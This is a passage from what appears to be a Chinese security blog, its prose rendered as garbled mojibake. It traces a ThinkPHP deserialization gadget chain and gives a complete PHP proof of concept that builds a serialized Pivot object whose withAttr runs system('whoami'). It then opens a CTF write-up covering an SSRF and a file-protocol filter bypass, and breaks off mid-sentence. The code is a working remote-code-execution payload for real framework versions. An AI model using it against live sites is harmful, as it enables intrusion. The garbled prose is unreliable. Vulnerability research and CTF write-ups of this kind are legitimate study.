alt="image-20220619141610797"></a></p><p>ç»§ç»­è·Ÿè¿›<code>$this-&gt;toArray()</code>ï¼š</p><p><a href="/images/62aee73b09475431296d1b5b.png" title="image-20220619141912697" class="gallery-item"><img src="/images/62aee73b09475431296d1b5b.png" alt="image-20220619141912697"></a></p><p>å‘ç°è¿™é‡Œçš„<code>$data</code>å˜é‡æ˜¯å°†<code>$this-&gt;data</code>ä¸<code>$this-&gt;relation</code>è¿›è¡Œåˆå¹¶ï¼Œæ¥ç€éå†<code>$data</code>è¿™ä¸ªæ•°ç»„ï¼Œæœ€ç»ˆæ‰§è¡Œå›¾ä¸­ç®­å¤´æ‰€ç¤ºçš„ä»£ç ï¼Œæ‰§è¡Œ<code>$this-&gt;getAttr($key)</code>ã€‚å¯ä»¥å‘ç°å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>$this-&gt;data</code>å’Œ<code>$this-&gt;relation</code>å…¶ä¸€ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶è¿™ä¸ª<code>$key</code>ï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶<code>$this-&gt;getAttr()</code>çš„å‚æ•°ã€‚é‚£ä¹ˆè·Ÿè¿›ä¸€ä¸‹<code>$this-&gt;getAttr()</code>ï¼š</p><p><a href="/images/62aee74709475431296d2c2c.png" title="image-20220619142339508" class="gallery-item"><img src="/images/62aee74709475431296d2c2c.png" alt="image-20220619142339508"></a></p><p>å‘ç°è¿™é‡Œçš„<code>$this-&gt;getData()</code>ä¼ å…¥äº†æˆ‘ä»¬çš„å¯æ§å‚æ•°<code>$name</code>ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="/images/62aee75409475431296d3d38.png" title="image-20220619142609634" class="gallery-item"><img src="/images/62aee75409475431296d3d38.png" alt="image-20220619142609634"></a></p><p><code>$this-&gt;getRealFieldName()</code>æ–¹æ³•ä¸­ä¼ å…¥äº†å¯æ§å‚æ•°<code>$name</code>ï¼Œç»§ç»­è·Ÿè¿›ï¼š</p><p><a href="/images/62aee76309475431296d500d.png" title="image-20220619142828483" class="gallery-item"><img src="/images/62aee76309475431296d500d.png" alt="image-20220619142828483"></a></p><p>å‘ç°è¿™é‡Œé»˜è®¤è¿”å›çš„å°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å¯æ§å‚æ•°<code>$name</code>ã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´<code>getData()</code>ä¸­çš„<code>$fieldName</code>å¯æ§ï¼Œé‚£ä¹ˆç´§æ¥ç€çš„æ˜¯<code>getData()</code>ä¸­è¿”å›çš„å€¼ï¼ˆ<code>$this-&gt;data[$filedName]</code>ï¼‰å¯æ§ï¼Œç„¶åå°±æ˜¯<code>getAttr()</code>ä¸­çš„<code>$value</code>å¯æ§ï¼Œè¿™ä¸€ç‚¹å¯ä»¥é€šè¿‡è§‚å¯Ÿä¸Šé¢ä¸‰å‰¯å›¾ç‰‡å¯ä»¥çŸ¥é“ã€‚</p><p>å‘ç°<code>getAttr()</code>ä¸­çš„<code>$value</code>å¯æ§ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯<code>getAttr()</code>ä¸­çš„<code>$this-&gt;getValue()</code>äº†ï¼Œè·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><a href="/images/62aee77609475431296d6b85.png" title="image-20220619143734568" class="gallery-item"><img src="/images/62aee77609475431296d6b85.png" alt="image-20220619143734568"></a></p><p>å…¶ä¸­<code>$fieldName = $this-&gt;getRealFieldName($name);</code>ï¼Œ<code>getRealFieldName()</code>æˆ‘ä»¬åˆšåˆšçœ‹äº†ï¼Œé»˜è®¤è¿”å›çš„å°±æ˜¯<code>$name</code>ï¼Œå› æ­¤è¿™é‡Œçš„<code>$fieldName</code>çš„å€¼å°±æ˜¯<code>$name</code>ã€‚æ¥ç€å®¡è®¡ï¼Œå¯ä»¥å‘ç°<code>$this-&gt;getJsonValue()</code>ä¸­ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p><p><a href="/images/62aee79c09475431296da44a.png" title="image-20220619143938750" class="gallery-item"><img src="/images/62aee79c09475431296da44a.png" alt="image-20220619143938750"></a></p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹æˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼š<code>$name</code>,<code>$value</code>,<code>$this-&gt;withAttr</code>ã€‚å®¡è®¡ä¸€ä¸‹è¿™æ®µéå†æ•°ç»„çš„éƒ¨åˆ†ï¼Œå› ä¸ºè¿™é‡Œéå†çš„æ˜¯<code>$this-&gt;withAttr[$name]</code>ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°†<code>$this-&gt;withAttr[$name]</code>è®¾ä¸ºä¸€ä¸ªæ•°ç»„ã€‚å¹¶ä¸”è¿˜å¯ä»¥å‘ç°<code>$value</code>ä¹Ÿåº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚é‚£ä¹ˆè‡³æ­¤æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;data=[<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]] <span class="comment"># $nameæ­¤æ—¶ä¸º&#x27;rainb0w&#x27;,$valueä¸º[&#x27;temp&#x27;=&gt;&#x27;whoami&#x27;]</span></span><br><span class="line">è¿›å…¥<span class="title function_ invoke__">getJsonValue</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withAttr=[<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]] </span><br><span class="line">è¿›è¡Œéå†æ“ä½œæ—¶ï¼Œéå†çš„æ•°ç»„å°±æ˜¯<span class="variable language_">$this</span>-&gt;withAttr[<span class="string">&#x27;rainb0w&#x27;</span>],ä¹Ÿå°±æ˜¯[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]è¿™ä¸ªæ•°ç»„ã€‚å…¶ä¸­<span class="variable">$key</span>ä¸ºtemp,<span class="variable">$closure</span>ä¸ºsystem</span><br><span class="line"><span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>ï¼Œè¿›å…¥<span class="keyword">if</span></span><br><span class="line"><span class="variable">$value</span>[<span class="string">&#x27;temp&#x27;</span>] = <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>,<span class="variable">$value</span>)</span><br></pre></td></tr></table></figure><p>èµ·åˆæˆ‘ä»¥ä¸º<code>$value[&#39;temp&#39;] = system(&#39;whoami&#39;,$value)</code>è¿™é‡Œå¹¶ä¸èƒ½æ‰§è¡ŒæˆåŠŸï¼Œåæ¥åœ¨æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><p><a href="/images/62aee7ac09475431296dbb77.png" title="image-20220619152556438" class="gallery-item"><img src="/images/62aee7ac09475431296dbb77.png" alt="image-20220619152556438"></a></p><p>è‡³æ­¤POPé“¾å·²ç»æ‰¾å®Œäº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯å†™POCäº†ã€‚ä¸è¿‡åœ¨å†™POCçš„ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆåœ¨app&#x2F;controller&#x2F;index.phpä¸­åŠ å…¥æˆ‘ä»¬çš„æµ‹è¯•ä»£ç ï¼š</p><p><a href="/images/62aee7f909475431296e2376.png" class="gallery-item"><img src="/images/62aee7f909475431296e2376.png"></a></p><h2 id="POCç¼–å†™"><a href="#POCç¼–å†™" class="headerlink" title="POCç¼–å†™"></a>POCç¼–å†™</h2><p>é¦–å…ˆå…¥å£æ˜¯Modelç±»ä¸­çš„<code>__desruct()</code>æ–¹æ³•ï¼š</p><p><a href="/images/62aee7bc09475431296dd17a.png" title="image-20220619152751168" class="gallery-item"><img src="/images/62aee7bc09475431296dd17a.png" alt="image-20220619152751168"></a></p><p>è¿™é‡Œéœ€è¦å°†<code>$this-&gt;lazySave</code>è®¾ä¸ºtrueï¼Œæ¥ç€è¿›å…¥<code>$this-&gt;save()</code>ï¼š</p><p><a href="/images/62aee81e09475431296e524b.png" title="image-20220619152841383" class="gallery-item"><img src="/images/62aee81e09475431296e524b.png" alt="image-20220619152841383"></a></p><p>è¿™é‡Œéœ€è¦å°†<code>$this-&gt;data</code>ä¸è®¾ä¸ºç©ºï¼Œä½¿å¾—<code>$this-&gt;isEmpty()</code>çš„å€¼ä¸ºfalseã€‚<code>$this-&gt;withEvent</code>è®¾ä¸ºfalseï¼Œä½¿å¾—<code>$this-&gt;trigger()</code>è¿”å›tureï¼Œä»è€Œä½¿å¾—false&#x3D;&#x3D;&#x3D;trueï¼Œç»•è¿‡ifã€‚æ¥ç€å°†<code>$this-&gt;exists</code>çš„å€¼è®¾ä¸ºtrueï¼Œæ‰§è¡Œ<code>$this-&gt;updateData()</code>ã€‚</p><p>å› æ­¤æ­¤æ—¶çš„POCå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†åœ°å†™POCä¹Ÿæ˜¯ä¸ºäº†æ›´æ–¹ä¾¿çš„å»äº†è§£æ•´ä¸ªPOCçš„ç¼–å†™æµç¨‹ã€‚ç»§ç»­æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œç¼–å†™POCã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯ä»è·Ÿè¿›<code>$this-&gt;updateData()</code>é‚£é‡Œå¼€å§‹äº†ï¼Œå‘ç°éœ€è¦å°†<code>$this-&gt;table</code>å’Œ<code>$this-&gt;suffix</code>è¿™ä¸¤ä¸ªå…¶ä¸­ä¸€ä¸ªnewä¸€ä¸ª<code>Conversion</code>ç±»ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>Conversion</code>ç±»æ˜¯è¢«traitä¿®é¥°çš„ç±»ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå¯å®ä¾‹åŒ–çš„ç±»ï¼š</p><p><a href="/images/62aee82f09475431296e660d.png" title="image-20220619154214044" class="gallery-item"><img src="/images/62aee82f09475431296e660d.png" alt="image-20220619154214044"></a></p><p>è¿™æ˜¯æ–‡æ¡£ä¸­å…³äºtraitçš„è§£é‡Šï¼š</p><p><a href="/images/62aee84109475431296e7cb1.png" title="image-20220619154300792" class="gallery-item"><img src="/images/62aee84109475431296e7cb1.png" alt="image-20220619154300792"></a></p><p>å› æ­¤æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸‹è°useäº†è¿™ä¸ª<code>Conversion</code>ç±»ï¼Œå…¨å±€æœç´¢ä¸€ä¸‹ï¼Œå‘ç°æ­£æ˜¯åˆšåˆšçš„<code>Model</code>ç±»ï¼š</p><p><a href="/images/62aee84b09475431296e8891.png" title="image-20220619154619063" class="gallery-item"><img src="/images/62aee84b09475431296e8891.png" alt="image-20220619154619063"></a></p><p>ä½†æ˜¯<code>Model</code>ç±»æ˜¯ä¸ªæŠ½è±¡ç±»abstractï¼Œä¹Ÿæ— æ³•è¢«è°ƒç”¨ï¼Œæˆ‘ä»¬éœ€è¦å†æ‰¾ä¸€ä¸‹è°useäº†<code>Model</code>ç±»ï¼Œç»§ç»­å…¨å±€æœç´¢ï¼Œæœ‰ç¬¦åˆçš„å¾ˆå¤šç±»ï¼Œä½†æ˜¯å¤§å¤šæ•°å¸ˆå‚…ä»¬éƒ½é€‰çš„æ˜¯è¿™ä¸ª<code>Pivot</code>ç±»ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œä¹Ÿæ¥ä½¿ç”¨ä¸€ä¸‹å§ï¼š</p><p><a href="/images/62aee85509475431296e9534.png" title="image-20220619154957327" class="gallery-item"><img src="/images/62aee85509475431296e9534.png" alt="image-20220619154957327"></a></p><p>ç»§ç»­ç¼–å†™ä¸€éƒ¨åˆ†POCï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">â€‹</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">â€‹</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">â€‹</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ç€ä»<code>toJson()</code>é‚£é‡Œçš„åˆ†æå¾€ä¸‹çœ‹ï¼š</p><p><a href="/images/62aee86b09475431296eb265.png" title="image-20220619160012428" class="gallery-item"><img src="/images/62aee86b09475431296eb265.png" alt="image-20220619160012428"></a></p><p>è¿™é‡Œçš„$dataçš„å€¼å°±æ˜¯<code>$this-&gt;data</code>çš„å€¼ï¼Œè°ƒç”¨äº†<code>$this-&gt;getAttr($key)</code>ï¼Œå…¶ä¸­çš„$keyå°±æ˜¯<code>$this-&gt;data</code>ä¸­çš„â€™rainb0wâ€™ã€‚è·Ÿè¿›<code>$this-&gt;getAttr()</code>ï¼š</p><p><a href="/images/62aee88609475431296ed28b.png" title="image-20220619160345824" class="gallery-item"><img src="/images/62aee88609475431296ed28b.png" alt="image-20220619160345824"></a></p><p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œè¿™ä¸ª$valueå°±æ˜¯<code>$this-&gt;data[&#39;rainb0w&#39;]</code>ã€‚æ¥ç€ä»è·Ÿè¿›<code>$this-&gt;getValue()</code>çš„åˆ†æé‚£é‡Œç»§ç»­èµ°ï¼š</p><p><a href="/images/62aee8dd09475431296f42c0.png" class="gallery-item"><img src="/images/62aee8dd09475431296f42c0.png"></a></p><p>å¦‚æœæƒ³è°ƒç”¨<code>$this-&gt;getJsonValue()</code>ï¼Œæˆ‘ä»¬å°±è¦è¿›å…¥ifè¯­å¥ã€‚å› æ­¤<code>$this-&gt;json</code>åº”è¯¥è¢«è®¾ä¸º<code>array(&#39;rainb0w&#39;)</code>ï¼Œ<code>$this-&gt;withAttr[&#39;rainb0w&#39;]</code>åº”è¯¥æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚</p><p>åˆ°<code>getJsonValue()</code>ï¼š</p><p><a href="/images/62aee89909475431296ee9b4.png" title="image-20220619160541293" class="gallery-item"><img src="/images/62aee89909475431296ee9b4.png" alt="image-20220619160541293"></a></p><p>è¿™é‡Œçš„<code>$this-&gt;withAttr</code>éœ€è¦çš„å€¼ä¹Ÿåœ¨ä¸Šé¢çš„åˆ†æä¸­ç»™å‡ºï¼ŒåŒæ—¶ä¹Ÿè¦è®©<code>$this-&gt;jsonAssoc</code>çš„å€¼åº”è¯¥æ˜¯trueï¼Œè¿™æ ·æ‰èƒ½è¿›å…¥ifä¸­ã€‚å› æ­¤å¯ä»¥ç¼–å†™å‡ºå…¨éƒ¨çš„POCäº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">lazySave</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$jsonAssoc</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;whoami&#x27;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;json = <span class="keyword">array</span>(<span class="string">&#x27;rainb0w&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&#x27;rainb0w&#x27;</span>=&gt;[<span class="string">&#x27;temp&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">urlencode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>())));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•åˆ©ç”¨"><a href="#æµ‹è¯•åˆ©ç”¨" class="headerlink" title="æµ‹è¯•åˆ©ç”¨"></a>æµ‹è¯•åˆ©ç”¨</h2><p>é¦–å…ˆç¡®ä¿index.phpä¸­å·²ç»å†™äº†ååºåˆ—åŒ–ç‚¹ï¼Œæ¯”å¦‚ï¼š</p><p><a href="/images/62aee91609475431296f81b0.png" title="image-20220619164738089" class="gallery-item"><img src="/images/62aee91609475431296f81b0.png" alt="image-20220619164738089"></a></p><p>æ¥ç€å»æµè§ˆå™¨ä¼ ä¸€ä¸‹payloadï¼Œå¼¹ä¸ªè®¡ç®—å™¨ç©ç©:</p><p><a href="/images/62aee91f09475431296f8cf0.png" title="image-20220619164901055" class="gallery-item"><img src="/images/62aee91f09475431296f8cf0.png" alt="image-20220619164901055"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022 SWCTF WriteUp</title>
      <link href="/2022/05/07/swctf/"/>
      <url>/2022/05/07/swctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>å†™ä¸€ä¸‹2022å¹´å®éªŒå®¤æ‹›æ–°èµ›é¢˜ç›®çš„wpå§ï¼Œè¿™æ¬¡æ‹›æ–°èµ›æˆ‘å‡ºäº†5é“Webé¢˜ç›®ï¼Œå¹¶ä¸”æ­å»ºäº†æ•´ä¸ªé¶åœºï¼Œæ”¶è·å¾ˆå¤šã€‚åœ¨å‡ºé¢˜çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘å¯¹ä¸€äº›é¢˜ç›®ä¹Ÿæœ‰äº†æ›´æ·±çš„ç†è§£ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹è¿™äº”é“é¢˜ç›®çš„é¢˜è§£å§ã€‚</p><h2 id="snertç¿»è¯‘"><a href="#snertç¿»è¯‘" class="headerlink" title="snertç¿»è¯‘"></a>snertç¿»è¯‘</h2><h3 id="è·å–çº¿ç´¢"><a href="#è·å–çº¿ç´¢" class="headerlink" title="è·å–çº¿ç´¢"></a>è·å–çº¿ç´¢</h3><p>æ‰“å¼€ç¯å¢ƒï¼ŒæŸ¥çœ‹ç½‘ç«™æºç ï¼Œå‘ç°ä¸€ä¸ªhintï¼š</p><p><a href="/images/4dd4c7e8bf650027.png" class="gallery-item"><img src="/images/4dd4c7e8bf650027.png"></a></p><p>ä¼ é€’<code>source</code>å‚æ•°ï¼Œå¾—åˆ°ï¼š</p><p><a href="/images/81be3812550efcdc.png" class="gallery-item"><img src="/images/81be3812550efcdc.png"></a></p><p>å¾ˆæ˜æ˜¾å°±å¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œè¾“å‡ºäº†<code>ifconfig</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™äº›è·å¾—ä¸€äº›å†…ç½‘ä¿¡æ¯ã€‚</p><p>è¾“å…¥æ¡†ä¸­éšæ„è¾“å…¥å­—ç¬¦ï¼Œé¡µé¢å“åº”æ—¶é—´å¾ˆé•¿ï¼Œå†åŠ ä¸Šåˆšåˆšå¾—åˆ°çš„ä¸€äº›ä¿¡æ¯ï¼ŒçŒœæµ‹è¿™é‡Œå­˜åœ¨ssrfæ¼æ´ï¼Œè¾“å…¥ç™¾åº¦åŸŸåè¿›è¡Œå°è¯•ï¼š</p><p><a href="/images/ed713dd72868ff05.png" class="gallery-item"><img src="/images/ed713dd72868ff05.png"></a></p><p>ç¡®è®¤æ˜¯ssrfæ¼æ´ã€‚å¯¹wordå‚æ•°è¿›è¡Œfuzzï¼Œå‘ç°<code>file</code>åè®®å’Œ<code>dict</code>åè®®è¿™ä¸¤ä¸ªå¸¸â½¤çš„è¯»å–â½‚ä»¶çš„åè®®è¢«è¿‡æ»¤ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼æ¥è¿›è¡Œç»•è¿‡ï¼š</p><p><code>file&lt;ç©ºæ ¼&gt;///xxxxx</code>ã€‚æ€æ ·å¾—çŸ¥æˆ‘ä»¬éœ€è¦è¯»å–çš„æ–‡ä»¶ç›®å½•å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸¤ä¸ªçº¿ç´¢ï¼Œé¦–å…ˆæˆ‘ä»¬åˆ©ç”¨wappalyzer</p><p><a href="/images/26e0bd7642a2c404.png" class="gallery-item"><img src="/images/26e0bd7642a2c404.png"></a></p><p>å¾—çŸ¥ç½‘ç«™çš„ç¼–ç¨‹è¯­è¨€ä½¿ç”¨çš„æ˜¯PHPï¼Œç„¶åæˆ‘ä»¬éšæ„è¿›å…¥ä¸€ä¸ªç›®å½•ï¼Œæ ¹æ®ç½‘ç«™å¼¹å‡ºæŠ¥é”™ä¿¡æ¯ï¼š</p><p><a href="/images/e4f11a8fd9e8a419.png" class="gallery-item"><img src="/images/e4f11a8fd9e8a419.png"></a></p><p>å¾—çŸ¥ç½‘ç«™ä½¿ç”¨çš„æ˜¯apacheè¿™ä¸ªwebæœåŠ¡å™¨ï¼Œè€Œapacheçš„é»˜è®¤ç½‘ç«™æ ¹ç›®å½•ä¸º&#x2F;var&#x2F;www&#x2F;htmlï¼Œå› 